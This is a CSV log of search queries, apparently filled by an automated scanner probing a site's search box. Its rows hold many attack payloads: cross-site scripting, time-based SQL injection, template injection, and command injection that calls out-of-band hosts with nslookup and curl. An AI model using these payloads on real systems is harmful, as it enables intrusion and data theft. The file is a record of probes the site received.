query_text,num_results,popularity,updated_at
test<ifRAme sRc=9741.com></IfRamE>,0,1,2024-06-11 17:41:35
test<a18OhCp x=9619>,0,1,2024-06-11 17:41:38
test<img sRc='http://attacker-9511/log.php?,0,1,2024-06-11 17:41:44
test<a8daDTY<,0,1,2024-06-11 17:42:00
testrS5v6GAc'; waitfor delay '0:0:15' --,0,1,2024-06-11 17:48:48
testA5VXqTj4' OR 923=(SELECT 923 FROM PG_SLEEP(15))--,0,1,2024-06-11 17:50:39
testvPY7H8HL') OR 246=(SELECT 246 FROM PG_SLEEP(15))--,0,1,2024-06-11 17:52:47
testXAhJLnvd')) OR 91=(SELECT 91 FROM PG_SLEEP(15))--,0,1,2024-06-11 17:54:54
@@EGRQg,0,1,2024-06-11 17:57:39
1DN5sZPLvLO,0,1,2024-06-11 18:19:34
${9999560+9999954},0,1,2024-06-11 18:20:21
{{61081*61081}},0,2,2024-06-11 18:20:59
response.write(9425169*9071300),0,1,2024-06-11 18:22:09
'+response.write(9425169*9071300)+',0,1,2024-06-11 18:22:13
"""+response.write(9425169*9071300)+""",0,1,2024-06-11 18:22:19
"""+""A"".concat(70-3).concat(22*4).concat(109).concat(69).concat(113).concat(68)+(require""socket""
Socket.gethostbyname(""hitjg""+""qps",0,1,2024-06-11 18:23:02
"'+'A'.concat(70-3).concat(22*4).concat(101).concat(75).concat(105).concat(71)+(require'socket'
Socket.gethostbyname('hitfv'+'cer",0,1,2024-06-11 18:23:04
"echo iwzbek$()\ vibqlu\nz^xyu||a #' &echo iwzbek$()\ vibqlu\nz^xyu||a #|"" &echo iwzbek$()\ vibqlu\nz^xyu||a #",0,1,2024-06-11 18:23:27
983988,0,1,2024-06-11 18:23:29
"&echo bkyqgm$()\ kfdhzn\nz^xyu||a #' &echo bkyqgm$()\ kfdhzn\nz^xyu||a #|"" &echo bkyqgm$()\ kfdhzn\nz^xyu||a #",0,1,2024-06-11 18:23:31
"test&echo whowjz$()\ adyytr\nz^xyu||a #' &echo whowjz$()\ adyytr\nz^xyu||a #|"" &echo whowjz$()\ adyytr\nz^xyu||a #",0,1,2024-06-11 18:23:36
"|echo edtlqm$()\ gllmjw\nz^xyu||a #' |echo edtlqm$()\ gllmjw\nz^xyu||a #|"" |echo edtlqm$()\ gllmjw\nz^xyu||a #",0,1,2024-06-11 18:23:41
"test|echo revoqb$()\ vfqvgj\nz^xyu||a #' |echo revoqb$()\ vfqvgj\nz^xyu||a #|"" |echo revoqb$()\ vfqvgj\nz^xyu||a #",0,1,2024-06-11 18:23:44
(nslookup -q=cname hitztztqcwooxeb01d.bxss.me||curl hitztztqcwooxeb01d.bxss.me)),0,1,2024-06-11 18:23:50
$(nslookup -q=cname hitfqxygeizvo3f4c1.bxss.me||curl hitfqxygeizvo3f4c1.bxss.me),0,1,2024-06-11 18:23:55
"&nslookup -q=cname hiteqharcrioy870bc.bxss.me&'\""`0&nslookup -q=cname hiteqharcrioy870bc.bxss.me&`'",0,1,2024-06-11 18:24:03
"&(nslookup -q=cname hitaydrfobadjeba52.bxss.me||curl hitaydrfobadjeba52.bxss.me)&'\""`0&(nslookup -q=cname hitaydrfobadjeba52.bxs",0,1,2024-06-11 18:24:06
'.gethostbyname(lc('hitro'.'utemzove4be7e.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(97).chr(80).chr(106).chr(66).',0,1,2024-06-11 18:24:10
|(nslookup -q=cname hitcwwlgnwsmta368d.bxss.me||curl hitcwwlgnwsmta368d.bxss.me),0,1,2024-06-11 18:24:10
""".gethostbyname(lc(""hitqk"".""vdvlnkam20289.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(104).chr(84).chr(117).chr(82).""",0,1,2024-06-11 18:24:13
`(nslookup -q=cname hitjvvxbuatqk8d8f7.bxss.me||curl hitjvvxbuatqk8d8f7.bxss.me)`,0,1,2024-06-11 18:24:16
;(nslookup -q=cname hitzbdrtgroly45946.bxss.me||curl hitzbdrtgroly45946.bxss.me)|(nslookup -q=cname hitzbdrtgroly45946.bxss.me||,0,1,2024-06-11 18:24:21
test'&&sleep(27*1000)*qqcbsh&&',0,1,2024-06-11 18:25:36
"test""&&sleep(27*1000)*ysbogf&&""",0,1,2024-06-11 18:25:39
test'||sleep(27*1000)*prxnrc||',0,1,2024-06-11 18:25:42
"test""||sleep(27*1000)*zywadm||""",0,1,2024-06-11 18:25:44
"test'""()&%<zzz><ScRiPt >nqUl(9689)</ScRiPt>",0,1,2024-06-11 19:15:22
"'""()&%<zzz><ScRiPt >nqUl(9490)</ScRiPt>",0,1,2024-06-11 19:15:26
test9635226,0,1,2024-06-11 19:15:29
test9635226<,0,1,2024-06-11 19:15:32
bfg3072＜s1﹥s2ʺs3ʹhjl3072,0,1,2024-06-11 19:15:35
bfgx9436??z1??z2a?bcxhjl9436,0,1,2024-06-11 19:15:40
bfg1746＜s1﹥s2ʺs3ʹhjl1746,0,1,2024-06-11 19:16:14
bfgx1739??z1??z2a?bcxhjl1739,0,1,2024-06-11 19:16:16
test</title><ScRiPt >nqUl(9890)</ScRiPt>,0,1,2024-06-11 19:16:53
"test""onmouseover=nqUl(91032)""",0,1,2024-06-11 19:16:58
"test""onmouseover=nqUl(97702)""",0,1,2024-06-11 19:17:01
"test"" X83B=nqUl([!+!]) Eev=""",0,1,2024-06-11 19:17:05
test\u0022onmouseover=nqUl(98433)\u0022,0,1,2024-06-11 19:17:14
%74%65%73%74%22%6F%6E%6D%6F%75%73%65%6F%76%65%72%3D%6E%71%55%6C%28%39%37%30%38%34%29%22,0,1,2024-06-11 19:17:17
"?""onmouseover=nqUl(93845)//",0,1,2024-06-11 19:17:20
"test""sTYLe='zzz:Expre/**/SSion(nqUl(9419))'bad=""",0,1,2024-06-11 19:17:24
"test""><script>nqUl(9263)</script>",0,1,2024-06-11 19:17:31
1CRLDMvSg4O,0,1,2024-06-11 19:44:06
{{7563*7563}},0,2,2024-06-11 19:45:00
${9999491+9999521},0,1,2024-06-11 19:44:58
response.write(9280615*9216670),0,1,2024-06-11 19:46:37
'+response.write(9280615*9216670)+',0,1,2024-06-11 19:46:41
"""+response.write(9280615*9216670)+""",0,1,2024-06-11 19:46:44
"""+""A"".concat(70-3).concat(22*4).concat(106).concat(78).concat(118).concat(65)+(require""socket""
Socket.gethostbyname(""hitnz""+""yqf",0,1,2024-06-11 19:46:57
"'+'A'.concat(70-3).concat(22*4).concat(110).concat(87).concat(98).concat(67)+(require'socket'
Socket.gethostbyname('hitrk'+'jcoa",0,1,2024-06-11 19:47:03
"echo veaqdb$()\ gefhgp\nz^xyu||a #' &echo veaqdb$()\ gefhgp\nz^xyu||a #|"" &echo veaqdb$()\ gefhgp\nz^xyu||a #",0,1,2024-06-11 19:47:19
"&echo hofzok$()\ yjtlll\nz^xyu||a #' &echo hofzok$()\ yjtlll\nz^xyu||a #|"" &echo hofzok$()\ yjtlll\nz^xyu||a #",0,1,2024-06-11 19:47:25
"test&echo fnnsjb$()\ bujtpg\nz^xyu||a #' &echo fnnsjb$()\ bujtpg\nz^xyu||a #|"" &echo fnnsjb$()\ bujtpg\nz^xyu||a #",0,1,2024-06-11 19:47:30
963872,0,1,2024-06-11 19:47:33
"|echo kfwkda$()\ omyhrv\nz^xyu||a #' |echo kfwkda$()\ omyhrv\nz^xyu||a #|"" |echo kfwkda$()\ omyhrv\nz^xyu||a #",0,1,2024-06-11 19:47:33
"test|echo gpcqtp$()\ zyueif\nz^xyu||a #' |echo gpcqtp$()\ zyueif\nz^xyu||a #|"" |echo gpcqtp$()\ zyueif\nz^xyu||a #",0,1,2024-06-11 19:47:37
(nslookup -q=cname hittctvnjoscqdcccb.bxss.me||curl hittctvnjoscqdcccb.bxss.me)),0,1,2024-06-11 19:47:40
$(nslookup -q=cname hitqdnjukgxudd3c87.bxss.me||curl hitqdnjukgxudd3c87.bxss.me),0,1,2024-06-11 19:47:43
"&nslookup -q=cname hitepnknxjokb96747.bxss.me&'\""`0&nslookup -q=cname hitepnknxjokb96747.bxss.me&`'",0,1,2024-06-11 19:47:49
"&(nslookup -q=cname hitzwneponniu90163.bxss.me||curl hitzwneponniu90163.bxss.me)&'\""`0&(nslookup -q=cname hitzwneponniu90163.bxs",0,1,2024-06-11 19:47:52
|(nslookup -q=cname hitavvpvqhpcob5c68.bxss.me||curl hitavvpvqhpcob5c68.bxss.me),0,1,2024-06-11 19:47:57
`(nslookup -q=cname hitiykjddrfyg1ce6f.bxss.me||curl hitiykjddrfyg1ce6f.bxss.me)`,0,1,2024-06-11 19:48:05
;(nslookup -q=cname hitxsseuukiou9ef01.bxss.me||curl hitxsseuukiou9ef01.bxss.me)|(nslookup -q=cname hitxsseuukiou9ef01.bxss.me||,0,1,2024-06-11 19:48:15
'.gethostbyname(lc('hitce'.'ngulbixsad444.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(119).chr(88).chr(97).chr(75).',0,1,2024-06-11 19:48:15
""".gethostbyname(lc(""hittg"".""hwaqsffheff9d.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(113).chr(66).chr(116).chr(84).""",0,1,2024-06-11 19:48:19
test'&&sleep(27*1000)*yarvjm&&',0,1,2024-06-11 19:48:44
"test""&&sleep(27*1000)*cmrlag&&""",0,1,2024-06-11 19:48:54
test'||sleep(27*1000)*bnbsfv||',0,1,2024-06-11 19:49:00
"test""||sleep(27*1000)*xyxzda||""",0,1,2024-06-11 19:49:05
test1jfqKWpL,0,1,2024-06-11 19:50:42
test' AND 2*3*8=6*8 AND 'ZKFU'='ZKFU,0,1,2024-06-11 19:52:46
"test"" AND 2*3*8=6*8 AND ""Lz1K""=""Lz1K",0,1,2024-06-11 19:52:56
test%' AND 2*3*8=6*8 AND 'AMHt'!='AMHt%,0,1,2024-06-11 19:52:59
-1 OR 2+807-807-1=0+0+0+1,0,1,2024-06-11 19:53:05
-1 OR 3+807-807-1=0+0+0+1,0,1,2024-06-11 19:53:08
"test'""()&%<zzz><ScRiPt >FFua(9503)</ScRiPt>",0,1,2024-06-11 19:55:26
"'""()&%<zzz><ScRiPt >FFua(9363)</ScRiPt>",0,1,2024-06-11 19:55:31
test9884384,0,1,2024-06-11 19:55:36
test9884384<,0,1,2024-06-11 19:55:40
bfg10693＜s1﹥s2ʺs3ʹhjl10693,0,1,2024-06-11 19:55:45
bfgx5663??z1??z2a?bcxhjl5663,0,1,2024-06-11 19:55:49
bfg3212＜s1﹥s2ʺs3ʹhjl3212,0,1,2024-06-11 19:56:31
bfgx9544??z1??z2a?bcxhjl9544,0,1,2024-06-11 19:56:35
test</title><ScRiPt >FFua(9101)</ScRiPt>,0,1,2024-06-11 19:57:39
"test""onmouseover=FFua(98852)""",0,1,2024-06-11 19:57:44
"test""onmouseover=FFua(96982)""",0,1,2024-06-11 19:57:51
"test"" WoGc=FFua([!+!]) SEF=""",0,1,2024-06-11 19:57:53
test\u0022onmouseover=FFua(99833)\u0022,0,1,2024-06-11 19:57:56
%74%65%73%74%22%6F%6E%6D%6F%75%73%65%6F%76%65%72%3D%46%46%75%61%28%39%35%30%31%34%29%22,0,1,2024-06-11 19:58:00
"?""onmouseover=FFua(91895)//",0,1,2024-06-11 19:58:03
"test""sTYLe='zzz:Expre/**/SSion(FFua(9905))'bad=""",0,1,2024-06-11 19:58:06
"test""><script>FFua(9446)</script>",0,1,2024-06-11 19:58:12
test5JbLFhyM'; waitfor delay '0:0:15' --,0,1,2024-06-11 20:05:58
testzj0COsQA' OR 881=(SELECT 881 FROM PG_SLEEP(15))--,0,1,2024-06-11 20:07:28
test6kheNEBj') OR 741=(SELECT 741 FROM PG_SLEEP(15))--,0,1,2024-06-11 20:08:54
testEijdMFAc')) OR 992=(SELECT 992 FROM PG_SLEEP(15))--,0,1,2024-06-11 20:10:31
@@Wv0Xb,0,1,2024-06-11 20:12:23
testErfdNc10,0,1,2024-06-11 20:57:07
test' AND 2*3*8=6*8 AND '3BU1'='3BU1,0,1,2024-06-11 20:58:48
"test"" AND 2*3*8=6*8 AND ""53kh""=""53kh",0,1,2024-06-11 20:58:51
test%' AND 2*3*8=6*8 AND 'tLDh'!='tLDh%,0,1,2024-06-11 20:58:54
-1 OR 2+724-724-1=0+0+0+1,0,1,2024-06-11 20:59:00
-1 OR 3+724-724-1=0+0+0+1,0,1,2024-06-11 20:59:05
testmy3Z3KhW'; waitfor delay '0:0:15' --,0,1,2024-06-11 21:10:26
testyPIDAd0j' OR 920=(SELECT 920 FROM PG_SLEEP(15))--,0,1,2024-06-11 21:12:19
test8P5ffYUM') OR 353=(SELECT 353 FROM PG_SLEEP(15))--,0,1,2024-06-11 21:13:58
testo1J5PA22')) OR 190=(SELECT 190 FROM PG_SLEEP(15))--,0,1,2024-06-11 21:16:04
@@KEe4H,0,1,2024-06-11 21:19:36
{{44234*44234}},0,2,2024-06-11 21:34:19
${9999773+9999736},0,1,2024-06-11 21:34:56
"echo pffgdj$()\ outnng\nz^xyu||a #' &echo pffgdj$()\ outnng\nz^xyu||a #|"" &echo pffgdj$()\ outnng\nz^xyu||a #",0,1,2024-06-11 21:35:59
"&echo ameqep$()\ llgndo\nz^xyu||a #' &echo ameqep$()\ llgndo\nz^xyu||a #|"" &echo ameqep$()\ llgndo\nz^xyu||a #",0,1,2024-06-11 21:36:04
response.write(9722619*9346379),0,1,2024-06-11 21:36:11
"test&echo yanwqv$()\ pxblcq\nz^xyu||a #' &echo yanwqv$()\ pxblcq\nz^xyu||a #|"" &echo yanwqv$()\ pxblcq\nz^xyu||a #",0,1,2024-06-11 21:36:13
'+response.write(9722619*9346379)+',0,1,2024-06-11 21:36:14
"|echo oqtdfa$()\ obacub\nz^xyu||a #' |echo oqtdfa$()\ obacub\nz^xyu||a #|"" |echo oqtdfa$()\ obacub\nz^xyu||a #",0,1,2024-06-11 21:36:18
"""+response.write(9722619*9346379)+""",0,1,2024-06-11 21:36:19
"test|echo tcrzzf$()\ sathme\nz^xyu||a #' |echo tcrzzf$()\ sathme\nz^xyu||a #|"" |echo tcrzzf$()\ sathme\nz^xyu||a #",0,1,2024-06-11 21:36:22
(nslookup -q=cname hitlvyqrwxwjl749e2.bxss.me||curl hitlvyqrwxwjl749e2.bxss.me)),0,1,2024-06-11 21:36:26
$(nslookup -q=cname hitdxwqvcrinof211b.bxss.me||curl hitdxwqvcrinof211b.bxss.me),0,1,2024-06-11 21:36:29
931834,0,1,2024-06-11 21:36:34
"&nslookup -q=cname hitiyhieqdqkw6c901.bxss.me&'\""`0&nslookup -q=cname hitiyhieqdqkw6c901.bxss.me&`'",0,1,2024-06-11 21:36:34
"""+""A"".concat(70-3).concat(22*4).concat(99).concat(72).concat(122).concat(76)+(require""socket""
Socket.gethostbyname(""hitws""+""prtm",0,1,2024-06-11 21:36:40
"&(nslookup -q=cname hitmjlbhczipraa1da.bxss.me||curl hitmjlbhczipraa1da.bxss.me)&'\""`0&(nslookup -q=cname hitmjlbhczipraa1da.bxs",0,1,2024-06-11 21:36:43
"test'""()&%<zzz><ScRiPt >nNWm(9624)</ScRiPt>",0,1,2024-06-11 21:36:48
|(nslookup -q=cname hitpnyyupnxffd3575.bxss.me||curl hitpnyyupnxffd3575.bxss.me),0,1,2024-06-11 21:36:49
"'""()&%<zzz><ScRiPt >nNWm(9192)</ScRiPt>",0,1,2024-06-11 21:36:51
"'+'A'.concat(70-3).concat(22*4).concat(115).concat(73).concat(107).concat(86)+(require'socket'
Socket.gethostbyname('hitba'+'maq",0,1,2024-06-11 21:36:53
`(nslookup -q=cname hitbvwfygvwlv50671.bxss.me||curl hitbvwfygvwlv50671.bxss.me)`,0,1,2024-06-11 21:36:57
test9239528,0,1,2024-06-11 21:36:59
;(nslookup -q=cname hitpgirxcndnd94c86.bxss.me||curl hitpgirxcndnd94c86.bxss.me)|(nslookup -q=cname hitpgirxcndnd94c86.bxss.me||,0,1,2024-06-11 21:37:02
test9239528<,0,1,2024-06-11 21:37:03
bfg5143＜s1﹥s2ʺs3ʹhjl5143,0,1,2024-06-11 21:37:08
'.gethostbyname(lc('hitvc'.'cmegkmljc1fc7.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(122).chr(76).chr(101).chr(66).',0,1,2024-06-11 21:37:11
""".gethostbyname(lc(""hityk"".""otxgihaodb33e.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(117).chr(71).chr(121).chr(68).""",0,1,2024-06-11 21:37:14
bfgx6712??z1??z2a?bcxhjl6712,0,1,2024-06-11 21:37:15
test'&&sleep(27*1000)*vrtbla&&',0,1,2024-06-11 21:37:38
"test""&&sleep(27*1000)*ifauql&&""",0,1,2024-06-11 21:37:44
test'||sleep(27*1000)*xxvzqx||',0,1,2024-06-11 21:37:46
"test""||sleep(27*1000)*ypxwju||""",0,1,2024-06-11 21:37:49
bfg1083＜s1﹥s2ʺs3ʹhjl1083,0,1,2024-06-11 21:38:09
bfgx6031??z1??z2a?bcxhjl6031,0,1,2024-06-11 21:38:16
bfg10590＜s1﹥s2ʺs3ʹhjl10590,0,1,2024-06-11 21:38:54
bfgx6701??z1??z2a?bcxhjl6701,0,1,2024-06-11 21:38:57
bfg4535＜s1﹥s2ʺs3ʹhjl4535,0,1,2024-06-11 21:39:29
bfgx4519??z1??z2a?bcxhjl4519,0,1,2024-06-11 21:39:32
bfg7067＜s1﹥s2ʺs3ʹhjl7067,0,1,2024-06-11 21:40:04
bfgx7800??z1??z2a?bcxhjl7800,0,1,2024-06-11 21:40:06
testzPYvlcrq,0,1,2024-06-11 21:40:40
bfg2529＜s1﹥s2ʺs3ʹhjl2529,0,1,2024-06-11 21:40:48
bfgx2542??z1??z2a?bcxhjl2542,0,1,2024-06-11 21:40:51
bfg2735＜s1﹥s2ʺs3ʹhjl2735,0,1,2024-06-11 21:41:27
bfgx4206??z1??z2a?bcxhjl4206,0,1,2024-06-11 21:41:31
bfg1993＜s1﹥s2ʺs3ʹhjl1993,0,1,2024-06-11 21:42:02
bfgx9969??z1??z2a?bcxhjl9969,0,1,2024-06-11 21:42:05
bfg5623＜s1﹥s2ʺs3ʹhjl5623,0,1,2024-06-11 21:42:34
test' AND 2*3*8=6*8 AND 'xBBj'='xBBj,0,1,2024-06-11 21:42:37
bfgx4516??z1??z2a?bcxhjl4516,0,1,2024-06-11 21:42:39
"test"" AND 2*3*8=6*8 AND ""76wS""=""76wS",0,1,2024-06-11 21:42:41
test%' AND 2*3*8=6*8 AND 'mZxm'!='mZxm%,0,1,2024-06-11 21:42:45
-1 OR 2+285-285-1=0+0+0+1,0,1,2024-06-11 21:42:48
-1 OR 3+285-285-1=0+0+0+1,0,1,2024-06-11 21:42:55
test</title><ScRiPt >nNWm(9789)</ScRiPt>,0,1,2024-06-11 21:43:11
"test9097""();}]9050",0,1,2024-06-11 21:43:13
%74%65%73%74%39%39%38%31%22%28%29%3B%7D%5D%39%34%31%33,0,1,2024-06-11 21:43:17
test</script><script>nNWm(9429)</script>,0,1,2024-06-11 21:43:20
"test""onmouseover=nNWm(95772)""",0,1,2024-06-11 21:43:24
"test""onmouseover=nNWm(98302)""",0,1,2024-06-11 21:43:26
"test"" ZFpz=nNWm([!+!]) m6Q=""",0,1,2024-06-11 21:43:32
test\u0022onmouseover=nNWm(96503)\u0022,0,1,2024-06-11 21:43:36
%74%65%73%74%22%6F%6E%6D%6F%75%73%65%6F%76%65%72%3D%6E%4E%57%6D%28%39%34%30%31%34%29%22,0,1,2024-06-11 21:43:41
"?""onmouseover=nNWm(95455)//",0,1,2024-06-11 21:43:45
"test""sTYLe='zzz:Expre/**/SSion(nNWm(9963))'bad=""",0,1,2024-06-11 21:43:49
"test""><script>nNWm(9250)</script>",0,1,2024-06-11 21:43:53
test<ScRiPt >nNWm(9408)</ScRiPt>,0,1,2024-06-11 21:43:57
test<WOMHUS>QZ3UV[!+!]</WOMHUS>,0,1,2024-06-11 21:43:59
test<script>nNWm(9004)</script>,0,1,2024-06-11 21:44:03
test<script>nNWm(9124)</script>9124,0,1,2024-06-11 21:44:06
test<ScR<ScRiPt>IpT>nNWm(9270)</sCr<ScRiPt>IpT>,0,1,2024-06-11 21:44:09
"test<ScRiPt 
>nNWm(9028)</ScRiPt>",0,1,2024-06-11 21:44:12
test<ScRiPt/zzz src=//xss.bxss.me/t/xss.js?9881></ScRiPt>,0,1,2024-06-11 21:44:15
"test< ScRiPt 
>nNWm(9264)</ScRiPt>",0,1,2024-06-11 21:44:31
"test<svg	
? onload=nNWm(9387);>",0,1,2024-06-11 21:44:37
test<isindex type=image src=1 onerror=nNWm(9883)>,0,1,2024-06-11 21:44:44
"test<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9671'>",0,1,2024-06-11 21:44:49
test<body onload=nNWm(9823)>,0,1,2024-06-11 21:44:52
test<img src=//xss.bxss.me/t/dot.gif onload=nNWm(9063)>,0,1,2024-06-11 21:45:00
test<img src=xyz OnErRor=nNWm(9742)>,0,1,2024-06-11 21:45:09
"test<img/src="">"" onerror=alert(9839)>",0,1,2024-06-11 21:45:12
%74%65%73%74%3C%53%63%52%69%50%74%20%3E%6E%4E%57%6D%289313%29%3C%2F%73%43%72%69%70%54%3E,0,1,2024-06-11 21:45:17
test\u003CScRiPt\nNWm(9512)\u003C/sCripT\u003E,0,1,2024-06-11 21:45:23
test&lt;ScRiPt&gt;nNWm(9237)&lt;/sCripT&gt;,0,1,2024-06-11 21:45:29
?<img zzz onmouseover=nNWm(99801) //?>,0,1,2024-06-11 21:45:41
test<input autofocus onfocus=nNWm(9932)>,0,1,2024-06-11 21:45:47
test}body{zzz:Expre/**/SSion(nNWm(9173))},0,1,2024-06-11 21:46:01
"test4D8oS
<ScRiPt >nNWm(9137)</ScRiPt>",0,1,2024-06-11 21:46:10
test<WQEXBY>U0TWJ[!+!]</WQEXBY>,0,1,2024-06-11 21:46:15
test<ifRAme sRc=9769.com></IfRamE>,0,1,2024-06-11 21:46:18
test<a2bjfHw x=9925>,0,1,2024-06-11 21:46:23
test<img sRc='http://attacker-9295/log.php?,0,1,2024-06-11 21:46:30
test<aUFBEmN<,0,1,2024-06-11 21:46:44
testPnXx5xZ7'; waitfor delay '0:0:15' --,0,1,2024-06-11 21:55:56
test3ZoNJk6Y' OR 24=(SELECT 24 FROM PG_SLEEP(15))--,0,1,2024-06-11 21:58:07
testMnsjZjxs') OR 695=(SELECT 695 FROM PG_SLEEP(15))--,0,1,2024-06-11 22:00:21
testm9uAJGWF')) OR 827=(SELECT 827 FROM PG_SLEEP(15))--,0,1,2024-06-11 22:02:01
@@37POm,0,1,2024-06-11 22:03:57
1PfoBa2NO,0,1,2024-06-11 22:47:18
${10000142+9999479},0,1,2024-06-11 22:47:27
{{19389*19389}},0,2,2024-06-11 22:47:56
response.write(9102930*9717985),0,1,2024-06-11 22:48:57
'+response.write(9102930*9717985)+',0,1,2024-06-11 22:49:01
"""+""A"".concat(70-3).concat(22*4).concat(118).concat(89).concat(108).concat(72)+(require""socket""
Socket.gethostbyname(""hittn""+""fme",0,1,2024-06-11 22:49:09
"""+response.write(9102930*9717985)+""",0,1,2024-06-11 22:49:09
"'+'A'.concat(70-3).concat(22*4).concat(97).concat(68).concat(116).concat(82)+(require'socket'
Socket.gethostbyname('hitxx'+'pvri",0,1,2024-06-11 22:49:12
960324,0,1,2024-06-11 22:49:45
"echo ofpxxd$()\ lwrjdd\nz^xyu||a #' &echo ofpxxd$()\ lwrjdd\nz^xyu||a #|"" &echo ofpxxd$()\ lwrjdd\nz^xyu||a #",0,1,2024-06-11 22:49:46
"&echo qcnvgo$()\ cvwsoj\nz^xyu||a #' &echo qcnvgo$()\ cvwsoj\nz^xyu||a #|"" &echo qcnvgo$()\ cvwsoj\nz^xyu||a #",0,1,2024-06-11 22:49:50
"test&echo aubvrw$()\ kzsijf\nz^xyu||a #' &echo aubvrw$()\ kzsijf\nz^xyu||a #|"" &echo aubvrw$()\ kzsijf\nz^xyu||a #",0,1,2024-06-11 22:50:06
"|echo bloini$()\ fdtrnq\nz^xyu||a #' |echo bloini$()\ fdtrnq\nz^xyu||a #|"" |echo bloini$()\ fdtrnq\nz^xyu||a #",0,1,2024-06-11 22:50:16
"test|echo yhdqqp$()\ xkpyvn\nz^xyu||a #' |echo yhdqqp$()\ xkpyvn\nz^xyu||a #|"" |echo yhdqqp$()\ xkpyvn\nz^xyu||a #",0,1,2024-06-11 22:50:32
'.gethostbyname(lc('hitmt'.'itxflofn1809f.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(101).chr(87).chr(109).chr(71).',0,1,2024-06-11 22:50:35
(nslookup -q=cname hitzdzbszgjke19e13.bxss.me||curl hitzdzbszgjke19e13.bxss.me)),0,1,2024-06-11 22:50:39
""".gethostbyname(lc(""hitaz"".""ljbsjhid88c75.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(106).chr(78).chr(103).chr(90).""",0,1,2024-06-11 22:50:42
$(nslookup -q=cname hitumyqjjvivy343ae.bxss.me||curl hitumyqjjvivy343ae.bxss.me),0,1,2024-06-11 22:50:43
"&nslookup -q=cname hituzvogjcmcx15468.bxss.me&'\""`0&nslookup -q=cname hituzvogjcmcx15468.bxss.me&`'",0,1,2024-06-11 22:51:03
"&(nslookup -q=cname hitlsguwgysjt77d0e.bxss.me||curl hitlsguwgysjt77d0e.bxss.me)&'\""`0&(nslookup -q=cname hitlsguwgysjt77d0e.bxs",0,1,2024-06-11 22:51:18
|(nslookup -q=cname hitunfpigirlbe370a.bxss.me||curl hitunfpigirlbe370a.bxss.me),0,1,2024-06-11 22:51:21
test'&&sleep(27*1000)*xgtbox&&',0,1,2024-06-11 22:51:24
`(nslookup -q=cname hitosydinwadn3c2f8.bxss.me||curl hitosydinwadn3c2f8.bxss.me)`,0,1,2024-06-11 22:51:26
"test""&&sleep(27*1000)*meisle&&""",0,1,2024-06-11 22:51:28
test'||sleep(27*1000)*hmiynj||',9,1,2024-06-11 22:51:31
;(nslookup -q=cname hitpyzvdpzxfvc4ab8.bxss.me||curl hitpyzvdpzxfvc4ab8.bxss.me)|(nslookup -q=cname hitpyzvdpzxfvc4ab8.bxss.me||,0,1,2024-06-11 22:51:32
"test""||sleep(27*1000)*sdxboi||""",13,1,2024-06-11 22:51:34
"test'""()&%<zzz><ScRiPt >vFvy(9414)</ScRiPt>",0,1,2024-06-11 22:59:14
"'""()&%<zzz><ScRiPt >vFvy(9108)</ScRiPt>",0,1,2024-06-11 22:59:18
test9032426,0,1,2024-06-11 22:59:21
test9032426<,0,1,2024-06-11 22:59:30
bfg4044＜s1﹥s2ʺs3ʹhjl4044,0,1,2024-06-11 22:59:34
bfgx1054??z1??z2a?bcxhjl1054,0,1,2024-06-11 22:59:39
bfg7136＜s1﹥s2ʺs3ʹhjl7136,0,1,2024-06-11 23:00:08
bfgx3275??z1??z2a?bcxhjl3275,0,1,2024-06-11 23:00:12
bfg2655＜s1﹥s2ʺs3ʹhjl2655,0,1,2024-06-11 23:00:49
bfgx2759??z1??z2a?bcxhjl2759,0,1,2024-06-11 23:00:55
test</title><ScRiPt >vFvy(9839)</ScRiPt>,0,1,2024-06-11 23:01:22
"test9981""();}]9793",0,1,2024-06-11 23:01:27
%74%65%73%74%39%34%30%35%22%28%29%3B%7D%5D%39%32%33%36,0,1,2024-06-11 23:01:31
test</script><script>vFvy(9035)</script>,0,1,2024-06-11 23:01:34
testEH2ZS3OI,0,1,2024-06-11 23:22:59
test' AND 2*3*8=6*8 AND '8KO0'='8KO0,0,1,2024-06-11 23:25:19
"test"" AND 2*3*8=6*8 AND ""Lh3A""=""Lh3A",0,1,2024-06-11 23:25:22
test%' AND 2*3*8=6*8 AND 'AAwg'!='AAwg%,0,1,2024-06-11 23:25:25
